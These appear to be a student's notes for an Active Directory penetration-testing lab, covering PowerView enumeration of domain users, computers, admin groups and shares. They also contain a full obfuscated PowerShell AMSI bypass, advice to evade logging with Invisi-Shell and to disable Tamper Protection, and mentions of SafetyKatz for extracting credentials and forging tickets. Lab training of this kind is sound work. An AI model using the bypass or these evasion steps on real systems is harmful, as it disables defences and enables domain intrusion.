
# **Things to take note of**

- Remember to turn off or add an exception to your student VM's firewall when you run a listener for a reverse shell.
- The `C:\` directory is exempted from Windows Defender, but AMSI may detect some tools when you load them.
- Use the following to Bypass AMSI after loading invisi-shell -:


```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
- 
- You would need to turn off Tamper Protection on the student VM after getting user shell (Check Google on how to do this)


# **Things to do once you have a User first**


- Start a PowerShell session using Invisi-Shell to avoid enhanced logging


```powershell
# do this on MS-DOS
C:\users\studentx> cd \AD\Tools

C:\users\studentx> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# You should now have a powershell seesion
```

- Use the AMSI Bypass payload now
- Load `PowerView` in the PowerShell session.


```powershell
. C:\AD\Tools\PowerView.ps1
```



# **Enumeration**



### **Users**

```powershell
# Powerview (both are same command)
# One just shows you logoncount to detect decoy accounts

Get-DomainUser -Properties samaccountname,logonCount
Get-DomainUser | select -ExpandProperty samaccountname
```


### **Computers**


```powershell
# powerview
# shows username, equivalent to the whoami command
Get-DomainComputer | select Name

# shows domain network name, equivalent to the hostname command
Get-DomainComputer | select -ExpandProperty dnshostname
```




### **Domain Admins**


```powershell
# powerview
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# The most important piece of information from the output is (Note Down) -:
# MemeberName
# MemeberSID
```



### **Enterprise Admin**



```powershell
# powerview
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

# If you don't get any output after the above command note that
# We need to query the root domain as Enterprise Admins group is present only in # the root of a forest.

Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

# Also note down MemberName and MemberSID
```




### **Shares**



```powershell
# powerview
Invoke-ShareFinder -Verbose

# See content of provided shares

```































```
![](https://i.imgur.com/LiMEZ8q.png)

In the lab we are using `betterSafetyKatz.exe` to forge tickets only and `safetyKatz.exe` to extract information

# **Learning Objective 1**
```


